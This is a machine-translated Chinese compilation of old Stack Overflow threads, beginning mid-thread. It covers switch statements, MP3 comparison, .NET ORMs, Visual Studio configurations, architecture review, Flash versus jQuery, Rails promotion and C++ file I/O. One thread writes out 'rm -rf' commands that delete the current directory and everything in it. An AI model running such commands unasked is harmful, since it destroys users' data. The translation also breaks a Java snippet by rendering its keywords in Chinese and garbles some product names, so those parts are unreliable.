在我公司的代码库中需要重构的许多代码都会使整个类充满多个 switch 语句，因此您必须知道每个 switch 语句的存在。

最终，最干净的方式是将整个系统重构为策略模式，其中工厂控制基于 switch 语句的单个剩余副本的策略的创建。

由于时间限制，我们没有采取任何进一步的措施，因为这满足了我们的需求。仍然有一个巨大的 switch 语句，但只有一个，所以添加额外的策略只需要实现接口并将创建步骤添加到主 switch 语句。

* * *

## 回答 #20

> 赞同：1
> 
> 时间：2009-02-16T10:54:03.853

首先，你的目标不应该是实现“好的 OO 风格”，而是好的代码。而“好”至少意味着正确、清晰、可读和尽可能简单。

所以我将把问题重新表述为：**“使用 switch 是不是代码错误的标志？”** ，因为这才是我真正关心的。现在我将继续回答它。

嗯，这是一个好问题 :)*通常*，使用一次开关并不表示代码不好。但是，如果您在课堂上的多个点打开相同的东西，那么最好考虑一种替代设计，在该设计中，您可以用子类来表示开关替代方案 - 当您考虑到这一点时，请特别问自己，如果这样创建的类将是一个当前类的专业化，并且将具有 is-a 关系。如果是这样，这为使用继承提供了更多要点。

最后一条评论：“使用 [语言特性 X]*很*糟糕”非常接近于“语言设计者愚蠢地将 [语言特性 X] 包含在其中”。

* * *

## 回答 #21

> 赞同：0
> 
> 时间：2009-02-15T15:16:00.410

> case 语句几乎总是可以用多态性代替

并且

> ```
> boolean investable = customer.isInvestable(); 
> ```
> 
> 由于对 isInvestable 的调用是多态的，因此用于进行调用的实际算法取决于客户的类型。

我认为你们都**错了**。如果这只是希望获得商业贷款的客户的“可投资性”逻辑怎么办。也许客户对另一种产品的投资决策真的很不同，可能不是基于“类别”，而是基于他们住在哪里，是否已婚，他们在哪个行业工作？

另外，如果一直有新产品问世，每个产品都有不同的投资决策，我不想`Customer`每次都更新我的核心课程怎么办？

就像我说的，我并不是说`switch`总是好的——但同样它也可以是完全合法的。如果使用得当，它可以是一种非常清晰的编写应用程序逻辑的方式。

* * *

## 回答 #22

> 赞同：0
> 
> 时间：2009-02-15T17:50:19.557

“另外，如果一直有新产品问世，每个产品都有不同的投资决策，我不想每次都更新我的核心客户类怎么办？”

这让我想起：

```
接口可投资
{
    boolean isIvestible(客户 c);
}

FooInvestible 类
    实现可投资
{
    public boolean isInvestible(最终客户 c)
    {
        // 任何逻辑，无论是开关还是其他东西
    }
}

```

最初使用 swtich 并添加新类型的决策的“问题”是，您可能最终会遇到一些无法以理智方式维护的巨大老鼠巢代码。将决策分成几类会迫使决策制定被拆分。然后，即使您使用 switch，代码也可能保持更清晰和可维护。

# bash - 如何从当前目录中删除所有文件，包括当前目录？

> ID：550922
> 
> 赞同：7
> 
> 时间：2009-02-15T14:08:47.217
> 
> 标签：bash, file-io, command-line, delete-directory

如何从当前目录（包括当前目录）中删除所有文件和子目录？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2009-02-15T14:21:18.700

在使用 GNU 工具的 bash 下，我会这样做（在大多数情况下应该是安全的）：

```
rm -rf -- "$(pwd -P)" && cd .. 
```

不在 bash 下并且没有 GNU 工具，我会使用：

```
TMP=`pwd -P` && cd "`dirname $TMP`" && rm -rf "./`basename $TMP`" && unset TMP 
```

为什么这更安全：

*   在我们的目录以破折号开头的情况下结束参数列表`--`（非bash：`./`在文件名之前）
*   `pwd -P`不仅`pwd`在我们不在真实目录中而是在指向它的符号链接中的情况下。
*   `"`s 在目录包含空格的情况下围绕参数

一些随机信息（bash 版本）：

*   最后`cd ..`的 the 可以省略，但否则你将在一个不存在的目录中......

**编辑**：正如 kmkaplan 所指出的，这`--`不是必需的，因为它返回在 UNIX 上`pwd`始终以开头的完整路径名`/`

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-02-15T14:14:14.693

```
olddir=`pwd` && cd .. && rm -rf "$olddir" 
```

是必需的`cd ..`，否则它将失败，因为您无法删除当前目录。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-02-15T14:16:04.843

```
rm -fr "`pwd`" 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-02-15T15:14:02.303

我认为这在 DOS / Windows CMD 下是可能的，但我找不到在命令之间传递数据的方法。其他人可能知道解决方法？

```
FOR /F %i IN ('cd') DO SET MyDir=%i | CD .. | RD /S %MyDir% 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-02-15T14:13:16.410

操作系统？在基于 *NIX 的东西上，您正在寻找 'rm -rf directory/'

注意：“递归”的“-r”标志可能很危险！

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2014-10-19T03:15:14.517

您只需返回目标文件夹的父文件夹，然后使用“rm -rf yourFolder”。或者您可以使用 'rm -rf *' 从当前文件夹中删除所有文件和子文件夹。

# audio - 如何以编程方式比较 mp3

> ID：550927
> 
> 赞同：4
> 
> 时间：2009-02-15T14:11:44.510
> 
> 标签：audio, mp3, compare

我喜欢能够以编程方式比较 mp3。我不知道是什么问题。标题？直方图？渠道？有没有人有这方面的经验？

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2009-02-15T15:10:43.760

我写了关于音频指纹识别[的硕士论文。](http://daim.idi.ntnu.no/masteroppgaver/004/4014/masteroppgave.pdf)论文列出了一些开源解决方案来比较音乐听起来像什么的问题，并提供了它们之间的性能比较。可能有点矫枉过正，但是那里有一些非常不错的应用程序。

如果您只想通过标记数据进行比较，则要查看的标准是[ID3](http://id3.org/)。基本上有两个版本，第一个非常简单（ID3v1），由一个 MP3 末尾的 128 字节块组成。ID3v2 在 MP3 的开头放置了一个更大的、可变大小的块。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-08-27T15:03:40.747

> > 我喜欢能够以编程方式比较 mp3

我有同样的问题。我发现 iTunes 改变了我下载的许多 Amazon MP3，改变了时间/日期戳、文件大小，因此也改变了 MD5 签名。我的备份突然有很多几乎重复的文件。

当我进行 VIM 比较时，我可以看到更改仅限于文件的非常小的部分。即使在近距离放大的情况下，这些文件在 Audacity 中并排看起来都是一样的。

我的解决方案是创建 mp3 的无头 WAV 转储，然后比较每个 WAV 的 MD5 签名。FFMPEG 可以很容易地进行翻译。

```
ffmpeg -y -i $mp3 $mp3.wav;
md5sum $mp3.wav 
```

我创建了一个以 MD5 为键的哈希，指向原始 MP3 文件规范。将 wav 文件放在 SSD 上以提高速度。

蛮力，但它有效。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2009-02-15T14:43:27.633

我想您可以采取多种方法来解决此问题：

## 1.比较标签

您可以比较 mp3 标签中保存的数据。标签以[ID3](http://id3.org/)格式保存。有许多库可以帮助您访问标签，[tagLib](http://developer.kde.org/~wheeler/taglib.htm)是一种流行的选择（[TagLib Sharp](http://www.novell.com/products/linuxpackages/opensuse11.1/taglib-sharp.html) for .net 应用程序）

## 2.声学指纹

这是迄今为止最强大的方法，无论压缩甚至格式如何，您都可以找到匹配项。从文件中的实际音频创建一个独特的指纹，允许识别*歌曲*[echoprint](http://echoprint.me/)是一个开源示例。

## 3\. 从文件创建哈希

这是一种更快的方法，可让您找到内容完全匹配的文件。

* * *

一些进一步的阅读：

*   这里有一篇关于管理 mp3 集合（包括阅读标签）的有趣 MSDN 文章： [链接文本](http://msdn.microsoft.com/en-us/library/ms345151.aspx "使用 Visual Basic Express 和 SQL Server Express 管理音乐收藏")（它在 Visual Basic 中，但可能仍然有用。）

*   这里有一点文件格式的说明： [link text](http://www.mp3-converter.com/mp3codec/mp3_anatomy.htm "MP3 编解码器内部")

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2009-02-15T14:46:48.030

比较是什么意思？元数据（作者、标题等）、音频数据？出于什么目的 ？

比较音频数据的流行和基本方法是在某些频谱特征上计算某种距离，例如 MFCC：

[http://en.wikipedia.org/wiki/Mel_frequency_cepstral_coefficient](http://en.wikipedia.org/wiki/Mel_frequency_cepstral_coefficient)

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-07-22T11:40:50.530

为了更好地回答您的问题，我认为我们需要确切地知道您要做什么。

如果您想比较实际的歌曲，musicDNS 有一个能够创建音频指纹的库。可以在[此处](http://code.google.com/p/musicip-libofa/)找到名为 libOFA 的库。例如，musicbrainz 使用该指纹识别系统将数字音频文件与他们的数据库进行匹配。理论上，您可以使用它来比较两个不同的数字文件。

如果您正在寻找比较标签数据（id3v1/id3v2），有很多库可以为您做到这一点，提到了 taglib，libmpg123 也有自己的函数来提取标签数据。

libOFA 方法的好处是您可以相互比较不同的格式，因为指纹是在音频本身上完成的。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2019-05-28T22:49:16.367

看起来[Chromaprint 可以满足](https://acoustid.org/chromaprint)您的需求。它将 PCM 数据转换为音频指纹，然后您可以使用这些数据进行比较。

他们有一个 C API 库（不过它实际上是用 C++ 编写的）、一个 python 前端，以及一些用于将结果转换为 JSON 的实用程序，这意味着您可以使用另一种语言来操作数据。不过，我认为它们本身并不提供比较功能。

此外，如果您使用的是 Linux 系统，您很可能会找到它的软件包。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2022-02-03T14:34:50.110

我写了一个 php 来比较忽略所有标题、gfx 和其他信息的音频。基本上从文件列表 foreach 作为 $src: /usr/bin/ffmpeg -hide_banner -y -i "$src" -f s16le -acodec pcm_s16le output.raw 2> /dev/null md5 output.raw 文件（记录这个)，将其与其他人进行比较。转换后的文件是原始输出音频，除了创建散列之外不使用。我预见到我的脚本的唯一问题是在转换/散列后保留质量较低的文件或保留具有较少 ID3 标记的文件。虽然我是移动，而不是删除，所以仍然有旧文件。

* * *

## 回答 #8

> 赞同：-1
> 
> 时间：2009-02-15T15:02:27.650

我经常在 linux 上使用 fdupes 来定位重复文件。fdupes 使用 md5 校验和。

* * *

## 回答 #9

> 赞同：-1
> 
> 时间：2009-02-15T16:27:58.537

如果您只是想根据标签比较 mp3，我建议您使用[taglib](http://developer.kde.org/~wheeler/taglib.html)。

# .net - 关于学习哪个 .NET ORM 的一些建议

> ID：550929
> 
> 赞同：7
> 
> 时间：2009-02-15T14:12:04.730
> 
> 标签：.net, linq, nhibernate, orm

说我没用过 ORM 有点惭愧；您可能还记得，我的大部分职业经历都是在使用 Classic ASP 和小 .NET 进行黑客攻击，而我所做的往往只是维护。

为了我自己的职业生涯以及为工作中的新项目做准备（最终在.NET中完成！）我正在为这个项目做准备。

无论如何，我正在为项目使用 .NET 3.5（或计划，无论如何），所以我试图决定我想选择什么 ORM；就像我说的，我对他们不是很熟悉，但我通常知道他们应该做什么以及他们是如何做到的。我的选择基本上归结为 NHibernate 或 LINQ/Entity Framework。我没用过，但我看过一些 LINQ2SQL 和 NHibernate 的演示。

NHibernate 似乎总体上更强大（Linq2Sql 甚至不是“真正的”ORM），并且在 ALT.NET 社区中被大量使用，我想进一步探索。但是，EF 是 Microsoft 的产品，因此将被大多数开发团队大量使用，他们只使用 Microsoft 提供的任何产品，而不考虑任何替代品。

我听说过关于 EF 的好话和坏话，但如果/当我在一家拥有真正开发团队的公司找到一份更好的工作时，我想选择一些能给我打下良好基础并且对其他雇主看起来不错的东西。

**编辑：**我应该补充一点，如果选择 ORM 很重要，应用程序将不得不处理现有数据库。

**编辑（2009 年 2 月 15 日下午 6 点 48 分）：**它将使用的唯一数据库是 SQL Server 2005 Standard，在 Windows Server 2003 上运行。鉴于这是一个工作项目，我的目标是选择一些能赢的东西我不需要花很长时间来跟上进度（因为我需要提高工作效率，而且“学习新工具”看起来不太好管理）但是这比滚动我自己的 DAL 更好. 当时我还没有决定应用程序是智能客户端还是 ASP.NET 应用程序，但其中一部分很可能会使用 ASP.NET MVC 来完成。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2009-02-15T14:29:12.817

我会推荐 nhibernate - 因为它是开源的并且有一个非常活跃的社区帮助很容易获得。一个很好的起点是[NHibernate FAQ](http://blogs.hibernatingrhinos.com/nhibernate/Default.aspx)，它的范围从面向初学者的帖子到非常高级的概念。通过阅读并遵循[为 NHibernate 准备您的系统](http://web.archive.org/web/20090819114233/http://blogs.hibernatingrhinos.com/nhibernate/archive/2008/03/31/prepare-your-system-for-nhibernate.aspx)和[您的第一个基于 NHibernate 的应用程序开始运行](http://blogs.hibernatingrhinos.com/nhibernate/archive/2008/04/01/your-first-nhibernate-based-application.aspx)。

我工作过的所有雇主都使用 NHibernate for ORM in .NET 和 Hibernate for ORM in Java - 所以你应该从学习 NHibernate 中受益匪浅。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-02-15T19:04:23.043

[Rob Connery 的SubSonic](http://www.codeplex.com/subsonic)是基于 ActiveRecord 的“瑞士军刀”ORM。您可以在 30 分钟内提高工作效率。请注意，在配置选项等方面，它不是 NHibernate 的级别。它非常高效，并且代码非常干净。我们在大多数项目中都使用它。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-02-15T14:48:59.710

Stack Overflow 上有很多关于这个话题的讨论：

[您会为 .net 推荐什么对象映射器解决方案？](https://stackoverflow.com/questions/380620/what-object-mapper-solution-would-you-recommend-for-net-closed)

[可扩展性的最佳数据访问范式是什么？](https://stackoverflow.com/questions/67831/what-is-the-best-data-access-paradigm-for-scalability)

[持久性框架？](https://stackoverflow.com/questions/200847/persistence-framework)

EF 和 Nhibernate 都被认为对大型项目很有用。对 EF 表达的一些主要担忧是缺乏延迟加载/持久性无知。Nhibernate 的学习曲线更陡峭，需要更多的手动配置。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-02-15T15:13:15.737

为什么要在学习时将自己限制在一个范围内？为什么不涉足所有这些，看看哪些对你来说感觉最好？然后，您可以开始深入研究这些技术并从中获得更多收益。

就个人而言，我会从 LINQ to SQL 开始，因为它非常简单。玩弄它只是为了习惯如何使用 ORM 的想法。您会惊讶于它的简单性和上手的容易性，然后您可能会遇到许多导致一些人使用 Entity Framework 的痛点。

一旦您稍微使用了实体框架，您就会对它感到满意，或者您会想知道 nHibernate 和相关问题中提到的其他一些东西有什么大不了的。

在我看来，正是在这一点上，您将最有可能使用 nHibernate 之类的东西取得成功，这可能是第一次涉足 ORM 领域时很难学习的东西。

无论哪种方式，我都没有规定“我应该尝试哪一个”的思想流派。我说，都试试。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-02-15T18:55:17.280

我会说选择NHibernate。它被广泛使用，有许多教程和学习资源以及一个活跃的贡献组。它类似于 Hibernate，这意味着您在 .NET NHibernate 上学习的任何技能都可以移植到 Java。双赢等。:)

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2009-02-15T19:44:11.250

我赞同大卫罗宾斯提到的亚音速。我要指出的一个缺点是文档不够完美。使用起来非常简单，您只需要知道如何操作即可。

我想还有一件事值得一提：您需要支持哪些数据库？如果您需要使用 SQL Server 以外的任何东西，我不会使用 LINQ。我可能错了，但上次我检查时，除了 SQL Server 之外，对数据库没有任何好的支持。

我要提到的最后一件事是您不必只选择一个。我在同一个项目中使用了 nHibernate、LINQ to SQL 和 Subsonic，并取得了不错的成功（尽管我建议尽可能避免这种情况）。我的建议是花一点时间和他们在一起，了解每个人的优点。

以下是我要对每一个说的话：

*   LINQ to SQL - 很容易启动和运行。但是如果你想使用 SQL Server 以外的东西，你几乎是 SOL。
*   NHibernate - 这可能是所有 ORM 中最强大的，它支持大多数 RDBMS，但使用起来可能很乏味，因为没有很多真正好的免费代码生成器可供使用（不能代表虽然是非免费的）。
*   SubSonic - NHibernate 和 LINQ to SQL 之间的一个很好的折衷方案。它不像 NHibernate 那样支持那么多的 RDBMS，但它适用于您在商业世界中遇到的大多数 RDBMS。

**TL;DR**：NHibernate 如果您需要对数据库进行大量控制或需要支持一些模糊的东西。如果您需要使用 SQL Server 以外的其他工具，请使用 SubSonic。如果您只想针对 SQL Server 运行 LINQ to SQL。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-02-15T14:43:33.983

由于您使用的是 .NET 3.5，因此我推荐使用 LINQ。
LINQ 只要求实现 IEnumerable 和 IQueryable 接口。
这意味着它不仅限于关系数据。[另请参阅.NET 3.5](http://dotnetslackers.com/articles/net/ORMInNET35.aspx)
中的 ORM 文章

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2009-02-15T15:07:40.040

对于免费和开源的路线，NHibernate 很难被击败。这是一个成熟的 ORM，拥有非常活跃的社区和大量支持。NHibernate 有一个初步的学习曲线，但是，我认为你可能在它上面投入的努力是值得的。

如果您想留在 Micrsoft 的 .NET 世界中，LINQ 是一种很好的学习技术，而不仅仅是 LINQ2SQL（正如您所说，它不是一个成熟的 ORM），因为 LINQ 可以应用于对象、XML 和基本上任何 IEnumerable/IQueryable 的东西。

对于未来，我会推荐 Entity Framework（同样，在 Microsoft 世界中）。微软内部的 LINQ2SQL 团队发布了一些[听起来很吓人](http://blogs.msdn.com/adonet/archive/2008/10/31/clarifying-the-message-on-l2s-futures.aspx)的公告，似乎表明所有未来的开发工作都将投入到实体框架而不是 LINQ2SQL 中。无论如何，这些技术有一定程度的重叠。当然，我不相信 LINQ（一般来说）会很快消失，但我会小心长期投资*LINQ2SQL*。实体框架仍然相对较新，并且正在积极开发中，因此预计 EF 会在未来几个月/几年内成熟。

因此，此时此刻，LINQ2SQL 非常棒，您可以很快启动并运行它，而不必深入研究它的内部工作原理（即表达式树等），但对于未来，我建议使用实体框架/NHibernate，因为我相信这两个 ORM 将在未来几年内被大多数 .NET 开发团队使用。

当然，就是说，有无数种不同的 ORM 解决方案，我怀疑其中任何一种都不是万能的解决方案，所以你真的必须检查它们中的每一个，看看哪个是最适用于您正在从事的特定项目。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2010-06-21T12:07:21.663

签[出 XmlDataMapper](http://xmldatamapper.codeplex.com//)一个简单的免费 ORM（LGPL 许可证），与其他巨头相比，它的内存占用较低。
提供的示例项目应该足以开始使用。

要集成 XmlDataMapper，您只需 4 个小步骤

1.  为表创建业务实体/DTO
2.  使用表和 DTO 之间的映射信息创建一个 XML 文件。
3.  在配置中指定 DTO 和 xml 文件。
4.  只需调用 DTOConverter.Convert(dataReader) 和其他此类方法即可将您的数据库记录转换为 DTO / 业务实体

# visual-studio - 如何在 Visual Studio 中管理许多配置？

> ID：550931
> 
> 赞同：2
> 
> 时间：2009-02-15T14:13:25.663
> 
> 标签：visual-studio, configuration

好吧，我想管理 x86 和 x64 平台，以及许多不同的配置，例如“调试 CPU UMFPACK”、“释放 CUDA CNC”等。在更改项目属性时，如何一次将它们应用于多个配置/平台？我错过了 Visual Studio 中的某些内容吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-02-15T15:32:46.157

是的，你有。
您可以创建一组项目属性（“vsprops”）并从该组继承多个配置。
当你想改变他们所有的东西时，你只需改变他们都继承的那个。

转到属性管理器（查看->其他 Windows->属性管理器或查看->属性管理器）并右键单击其中一个配置。选择“添加新项目属性表”，为新表命名。现在，当您右键单击刚刚创建的工作表时，您可以更改其中的属性。您可以将此表添加到您拥有的任何其他配置中，方法是右键单击它并选择“添加现有属性表”。

当您编辑配置的属性时，您可以选择“从父​​级继承”，这会将值设置为父级的任何值。请注意，对于某些字段，值被替换 - 例如“General->Output Directory” - 而在其他字段中，它们被聚合，例如“C++->General->Additional Include Directories” 正确配置的值被添加到继承的价值观。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-02-15T14:21:41.820

在项目属性对话框中，从配置下拉框中选择“所有配置”或“多个配置”。

警告：该对话框将只显示与所选配置不同的属性值。您可能会不小心覆盖那里的某些内容。

# architecture - 如何分析系统架构？

> ID：550937
> 
> 赞同：1
> 
> 时间：2009-02-15T14:18:11.673
> 
> 标签：architecture, system

我希望这不会偏离本网站的主题。

最近，我有机会为客户审查银行系统。考虑到我不得不在自己的项目中思考架构和整体系统架构的时间，我发现这项任务有多么困难，这是非常了不起的。

我开始编写功能列表，但发现这太局限了，因为这只是供应商给我“是的，我们做 Web 服务”答案的问题。它会是一个很好的可扩展解决方案，还是对其专有 API 的精简包装？

从那以后，我决定通过使用一些主题来完成这项任务，并以对话的方式让供应商给我系统的要点（具体细节）。

您建议系统审查的主题是什么？

**我**发现最重要的一个主题是可扩展性以及系统支持更改同时仍允许升级的方式。编程接口的发现能力也是一项重要的工作。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-02-15T14:38:31.653

您可能需要添加：

*   安全
    性 如何管理对系统的访问？
    使用什么工艺？
    它在技术上是如何实现的？
*   审计
    您有哪些审计要求？
    是否记录了对系统的所有更改？
*   报告
    需要什么报告？
    如何控制对这些报告的访问？

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-02-15T14:39:02.793

我不了解你，但在我的企业中，更具挑战性的问题是：“你有什么？” 多少台服务器？有多少个数据库？软件 X 有多少实例？在那之后，按业务功能分解系统似乎更容易一些（“总账？就在这里。其他在那里 - 支出。”）

另一个问题是冗余数据。每一位信息都应该有一个来源/所有者，但事实是它在许多地方都是多余的和重复的。

能够进入每个系统并确定哪些系统拥有自己的客户端数据版本是一个巨大的挑战。

我们没有一种架构。它更像是所有东西的一点点：大型机、带有 Oracle 表单的客户端/服务器、Web、一些服务、Excel 和 Access 桌面应用程序——其中一些执行公司的关键功能——Java 和 .NET。这很复杂。

我希望你的情况会好一些。

[Altiris 之](http://www.symantec.com/business/theme.jsp?themeid=altiris)类的工具可以提供一些帮助。端口扫描可以识别坚持使用默认端口的应用程序。公开 WSDL 的 Web 服务很容易成为目标。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-24T12:00:48.747

我认为所有一般原则都适用，就像 Bravax 指出的那样。但我想补充一点，你应该注意“家庭”成长的解决方案。我知道一个银行系统有一个自定义队列，一个自定义缓存层。因此，本土解决方案值得关注。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-02-24T20:10:36.883

我想我的第一个问题是——你审查它是为了什么？你在为你的客户回答什么问题？

你提到了可扩展性，其他人提到了安全性、审计等。我可以在可扩展性、性能、延迟、可靠性等方面进行讨论，“ilities”的列表还在继续，但不知道你要评估的是什么，你可能会浪费你的时间和客户的时间。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-03-24T08:27:04.920

在审查银行系统和类似的软件系统时，我发现拥有某种研究机构可以依靠它是一种宝贵的资源。（考虑 Gartner/Forrester/等...）

出于严重的原因，这很重要。

第一的; 涉及很多政治，这些公司对您需要涵盖的领域的定义进行了一些详细的定义。第二; 这使您的评估在完成后更容易获得批准。第三; 您可以使用他们理解的词汇与供应商进行交流。

# javascript - 动画标题应该是 Flash 还是 javascript？

> ID：550958
> 
> 赞同：4
> 
> 时间：2009-02-15T14:38:22.280
> 
> 标签：javascript, jquery, flash, animation

我在一家小型网站建设公司工作，在我们的一个客户网站上，我们的横幅中有一个 Flash 动画。动画相当厚实，只有 4 兆字节。客户最近请求重建站点，该站点将再次包含动画标题。这次我们考虑不在 Flash 中构建标头（或者实际上在 Flash 中构建它，因为我们都不会真正做 Flash），而是在 Javascript 中自己构建它（使用 jQuery().animate() 和插件）。

这是一个坏主意吗？Flash 是否更适合动画标题？我了解您有更多选择，但您还要求用户下载 Flash 播放器，而 Javascript 广泛可用。
它也是一个非常简单的动画，它主要由文本弹出和弹出和一些图像移动/淡入淡出组成。

使用 jQuery 应该很容易吧（我认为自己对 jQuery 很有经验），为什么我们会选择 flash 方法而不是 javascript/jQuery 方法？

此外，如果我们选择 Javascript 方法，那么确保动画不会影响页面中其他任何内容的最佳方法是什么？在绝对位置的 div 中做完整的动画会奏效吗？

**编辑**
当我说横幅时，我实际上是指标题。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-02-15T15:55:38.910

按此顺序：

1.  不要在网页上使用任何动画。它看起来像一个广告，并分散了内容的注意力。这很烦人。

2.  Flash 是为动画而构建的。如果有知识，请使用它。

3.  尝试 JavaScript 并观察 CPU。我们用 jQuery 制作了一个简单的幻灯片，PC 在第一次运行后启动风扇。考虑限制动画，这样如果用户离开房间去洗手间，它就不会烧毁用户的计算机。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-02-15T21:51:54.297

您也可以尝试动画 GIF。有些人可能会认为它很古老，但它非常便携、小巧并且可以完成工作。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-02-15T16:09:45.757

4 兆的广告？这将直接进入我的过滤器文件！我会建议客户重新考虑他们的广告！

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-02-15T14:48:34.470

```
overflow: hidden; 
```

应该有助于 javascript 不影响其 div 之外的任何其他内容

但是我们用 Flash 制作了简单的动画，它们从未超过几百千字节。

我建议在 Flash 中进行并编写动画。Flash 动画中的哪些细节使它变得如此之大，您是否使用了非常大的资源并将它们缩小？

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-02-15T22:38:58.207

肯定是闪。用它来构建复杂的动画要容易得多，如果你决定以后开始使用 javascript 来做其他事情，几乎没有干扰事物的风险，如果我对动画有问题，我很容易摆脱 AdBlock（我愿意） .

如果您不太习惯在 Flash 中手动操作，您可能想查看 SWiSH，它非常适合创建客户似乎不费吹灰之力就喜欢的那种引人注目的怪物。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-02-15T23:13:36.097

Flash 具有大约 85% 的浏览器渗透率，因此这不应该成为问题。此外，您使用 jQuery animate() 所做的任何事情都不会像使用 Flash 所做的那样好。但是如果你没有这个技能，那真的没有进一步讨论的意义。使用你所知道的 - animate() 离开 - 它只是一个该死的横幅/标题 - 并开始下一个项目。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-02-15T22:00:58.423

有一些技术可以减小闪存大小。看看[这个](http://www.grantasticdesigns.com/flashcompression.html)和[这个](http://www.layoutgalaxy.com/html/htmnewletter56-page1.htm)。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-02-18T15:36:32.863

你见过这个吗？[http://robot.anthonycalzadilla.com/](http://robot.anthonycalzadilla.com/)与 Flash 类似，但使用 jQuery 构建。jQuery（或其他 JavaScript）动画的一个优点是任何 HTML 文本都可以被搜索引擎（和屏幕阅读器）看到。

* * *

## 回答 #9

> 赞同：-1
> 
> 时间：2017-09-13T19:04:20.513

截至 2017 年，许多人会在 html5 canvas/javascript 中执行此操作。麦当劳（特别是 Happy Meals 子网站）是一个使用 html5/javascript 在页面背景上移动元素的网站。

# ruby-on-rails - 我可以在哪里推广 Rails 应用程序？

> ID：550964
> 
> 赞同：2
> 
> 时间：2009-02-15T14:41:56.653
> 
> 标签：ruby-on-rails, promoting

我目前正在编写一个 FOSS Rails 应用程序，并且想了解一些关于在哪里推广该应用程序的想法。我正在寻找类似 opensourcerails.com 或 wiki.rubyonrails.org/rails/pages/OpenSourceProjects

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-02-15T14:48:02.333

也把它放在 github 上——它是社交的、面向 Rails 的，而且免费的 repos 必须是开源的。

编辑：那么，我会联系有关它的主要博客。与仅仅停留在静态项目列表上相比，他们会更快地得到消息。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-02-15T21:39:35.200

不要将其宣传为 Rails 应用程序。将其推广为一个可以解决您的应用程序要解决的任何问题的应用程序。我怀疑有很多人坐在那里想，“男孩，我肯定想运行一个 Rails 应用程序。我想知道我可以运行什么应用程序。” 相反，他们的想法是，“男孩，我真希望有一个与 Twitter 集成的 FOSS 实时博客应用程序。”

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-02-15T21:13:17.650

尝试找到可以从使用您的应用程序中受益的人并告诉他们。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-02-16T04:08:02.177

使用 Rails 有一个展示部分（以前为 HappyCodr）

[http://workingwithrails.com/browse/sites/showcase](http://workingwithrails.com/browse/sites/showcase)

You need to create a profile to add your project

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-02-18T17:43:10.623

You can also post to these sites:

[http://www.rubyflow.com/](http://www.rubyflow.com/)

[http://www.reddit.com/r/ruby/](http://www.reddit.com/r/ruby/)

Let these guys know about your projects, too:

[http://railsenvy.com/](http://railsenvy.com/)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-02-15T15:19:14.567

你可以请做各种 Rails 播客的人提一下。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-02-16T02:46:45.850

在来自世界各地的人们订阅的[ruby​​onrails-talk 邮件列表](http://groups.google.com/group/rubyonrails-talk)上宣布它。从那里开始，如果你继续做好事，口碑应该传播开来。

如果我们知道您的应用程序*做*了什么，我们可以更准确地确定将这些东西放在哪里。

# c++ - C++ 文件处理

> ID：550969
> 
> 赞同：-1
> 
> 时间：2009-02-15T14:43:59.100
> 
> 标签：c++, file-io

我四处搜索，但没有找到任何好的示例/教程。

所以我问你 SOF：你如何用 C++ 读写文件？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-02-15T14:46:44.957

这太有趣了。我在谷歌中输入*了 How do you Read and Write to a File in C++*并找到了很多结果，比如[这个](http://www.cplusplus.com/doc/tutorial/files.html)。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-02-15T14:47:10.370

一些帮助您入门的参考资料：

*   [http://www.daniweb.com/forums/thread6542.html](http://www.daniweb.com/forums/thread6542.html)
*   [http://www.cplusplus.com/doc/tutorial/files.html](http://www.cplusplus.com/doc/tutorial/files.html)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-02-15T14:47:16.877

尝试对最基本的文件 I/O使用[fopen](http://www.cplusplus.com/reference/clibrary/cstdio/fopen.html)、[fwrite](http://www.cplusplus.com/reference/clibrary/cstdio/fwrite.html)、[fread](http://www.cplusplus.com/reference/clibrary/cstdio/fread.html)和[fclose函数，例如](http://www.cplusplus.com/reference/clibrary/cstdio/fclose.html)

```
#include <stdio.h>

int main(int argc, char** argv)
{
  FILE* f = fopen("hello world.txt", "wb");
  if(!f) return -1;
  fwrite("Hello World", sizeof(char), 11, f);
  fclose(f);
  return 0;
} 
```

